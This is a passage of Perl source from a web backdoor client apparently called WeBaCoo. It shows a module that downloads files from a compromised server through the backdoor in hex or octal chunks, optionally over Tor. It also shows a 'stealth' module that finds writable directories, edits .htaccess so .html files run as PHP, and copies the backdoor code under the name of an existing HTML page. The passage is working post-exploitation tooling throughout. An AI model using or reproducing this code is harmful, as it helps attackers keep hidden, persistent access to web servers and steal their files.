	else { cmd_request(); }

	# Check for not found response
	if(index($output_str,"No such") ne -1) {
	    print "\n[-] Remote file does not exist.\n";
	    print "[-] Download failed and module unloaded.\n";
	    $loaded_module = '';
	    return ;
	}

	# Remove whitespaces from server's response
	$output_str =~ s/\s//g;

	# Open a local file stream to store the received chunks
	open (DOWNFILE, ">$lfile.tmp") or die $!;

	# Store the first chunk
	print DOWNFILE $output_str;

	# While server responds with non-empty chunk 
	# loop to retrieve the full file content.
	while (1) {

	    # Increse pivot counter
	    $pivot = $pivot + 1000;

	    print "[*] Retrieving $pivot-",$pivot + 1000," bytes of remote file.\n";

	    # Form command with new boundaries
	    if($tool eq 'xxd') { $command = "xxd -ps -l 1000 -s $pivot $modargs[1]"; }
	    elsif($tool eq 'od') { $command = "od -An -b -N 1000 -j $pivot $modargs[1]"; }
	    if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	    else { cmd_request(); }

	    # 'xxd' return empty response when EOF
	    if($output_str eq '') { last; }
	    # 'od' return relevant message
	    if(index($output_str,"cannot skip") ne -1) { last; }

	    # Remove whitespaces from server's response
	    $output_str =~ s/\s//g;

	    # Write chunk to file
	    print DOWNFILE $output_str;
	}

	# Close the local file stream
	close (DOWNFILE);

	# Call the external xxd to reassemble the hex file
	if($tool eq 'xxd') {
	    system("xxd -ps -r $lfile.tmp > $lfile");
	}
	# In case of 'od' tool to avoid endianess problems
	# the file is read in octal format.
	# Initially convert octal to hex and then revert
	# to original file using the xxd tool.
	elsif($tool eq 'od') {
	    my $tmpbuf = '';

	    # Read file (octal format)
	    open (TMPFILE, "<$lfile.tmp") or die $!;

	    # Write file (hex format)
	    open (WRFILE, ">$lfile.tmp2") or die $!;

	    # Store octal to buffer
	    while (<TMPFILE>) { $tmpbuf .= $_; }

	    # Convert octal to hex
	    while($tmpbuf =~ /(.{3})/sg) {
		printf WRFILE "%02x",oct($1);
	    }

	    # Close temp files
	    close(TMPFILE);
	    close(WRFILE);

	    # Revert hex to original file
	    system("xxd -ps -r $lfile.tmp2 > $lfile");

	    # Remove temp generated file
	    system("rm $lfile.tmp2");
	}   

	# Remove temp storage file
	system("rm $lfile.tmp");

	# Print success message
	print "\n[+] File successfully downloaded at current directory.\n";

	# Unload download module
	$loaded_module = '';
	print "[*] Download module unloaded.\n";
	return ;
    }
    # Stealth Module
    elsif($modargs[0] eq "stealth") {
	if(@modargs != 2) { print "[-] Error loading stealth module\n"; return; }

	$loaded_module = 'stealth';

	my $wr_dir = '';

	# Formalize directory path
	if((substr $modargs[1],-1,1) eq "/") { chop($modargs[1]); }

	# Search for writable directories
	print "[*] Searching for user writable directory.\n";
	$command = "find $modargs[1] -user `whoami` -type d -perm /u+w 2>&1 | grep -v \"denied\" | head -1 ";
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	else { cmd_request(); }

	if($output_str eq '') {
	    print "[-] No user writable directory found.\n";
	    print "[*] Searching for group writable directory.\n";
	    $command = "for g in \$(groups `whoami` | cut -f2 -d:); do find $modargs[1]"
		.' -group "$g" -type d -perm /g+w 2>/dev/null; done | head -1;';
	    if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	    else { cmd_request(); }

	    if($output_str eq '') {
		print "[-] No group writable directory found.\n";
		print "[*] Searching for other writable directory.\n";
		$command = "find $modargs[1] -type d -perm /o+w 2>&1 | grep -v \"denied\" | head -1 ";
		if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
		else { cmd_request(); }

		if($output_str eq '') {
		    print "[-] No other writable directory found.\n";

		    # If no writable dir founds, search for .htaccess files
		    print "[*] Searching for '.htaccess' files.\n";
		    $command = "find $modargs[1] -type f -name .htaccess -exec ls -adl {} \\; 2>&1 | grep -v \"denied\"";
		    if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
		    else { cmd_request(); }
		    if($output_str ne '') {
			print "$output_str\n\n";
			print "[*] Check if you have write permissions to any of the above files.\n";
			print "[*] If so, use the 'php_value auto_prepend_file' option.\n";
		    }
		    else { print "[-] No '.htaccess' files found.\n"; }
		    print "\n[-] Module failed to automatically increase stealth status.\n";
		    $loaded_module = '';
		    return ;
		}
		# Proceed with other dir
		else { $wr_dir = $output_str; }
	    }
	    # Proceed with group dir
	    else { $wr_dir = $output_str; }
	}
	# Proceed with owner dir
	else { $wr_dir = $output_str; }

	# Print founded writable directory
	print "[+] Writable directory detected at '$wr_dir'\n";

	# Check if .html file exists
	$command = "find ./ -name '*.html' 2>&1 | grep -v 'denied' | head -1";
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	else { cmd_request("1"); }

	# If no .html files exist, print and return from module load
	if($output_str eq '') {
	    print "\n[-] No .html files located.\n";
	    print "[-] Module failed to automatically increase stealth status.\n";
	    $loaded_module = '';
	    return ;
	}

	# Create a special handle type rule using htaccess
	$command = "grep -q 'x-httpd-php .html' $wr_dir/.htaccess && exit; ".
		   "echo 'AddType application/x-httpd-php .html' | tee -a $wr_dir/.htaccess";
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	else { cmd_request("1"); }

	# Locate backdoor code file
	my $code_file = basename $WEBACOO{uri};

	# Copy backdoor code to new file named as an existing html file
	$command = "f=`find ./ -name '*.html' 2>&1 | grep -v 'denied' | head -1`; ".
		   "cp \$f $wr_dir/ ; cat $code_file | ".
		   'grep "\$b=strrev(" | tee '."$wr_dir".'/`basename $f`';
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	else { cmd_request("1"); }

	# Unload module
	$loaded_module = '';

	# Print new backdoor path
	print "\n[+] Backdoor code is available at $wr_dir/";
	$command = "f=`find ./ -name '*.html' | head -1`; basename \$f";
	if(defined $args{p} && $args{p} eq "tor") { tor_cmd_request(); }
	else { cmd_request("1"); }

	# Print info and return from module
	print "[!] If shell spawn at new URI failed, server config does not allow type overrides.\n";
	print "\n[*] Stealth module undloaded.\n";

	return ;
    }
    else { print "[-] Unknown module name.\n"; return; }

    # Print module help messages
    print "[+] $modargs[0] module successfully loaded.\n";
    print "[*] Type 'unload' to unload the module and return to the original cmd.\n\n";
}

#################################################################################
# Unload extension modules
sub unload_module
{
    # Print notification message
    print "\n[+] $loaded_module has been unloaded.\n";

    # Revert to initial state the module related global variables
    $WEBACOO{shell_name} = "webacoo";
    $WEBACOO{shell_head} = '$ ';
    $loaded_module = '';
    $module_ext_head = '';
    $module_ext_tail = '';
}

#################################################################################
# Random string for tmp file names
sub random_string
{
    my $length = shift;

    my @chars=('a'..'z','A'..'Z');
    my $random_string;
    foreach (1..$length) 
    {
	$random_string.=$chars[rand @chars];
    }
    return $random_string;
}
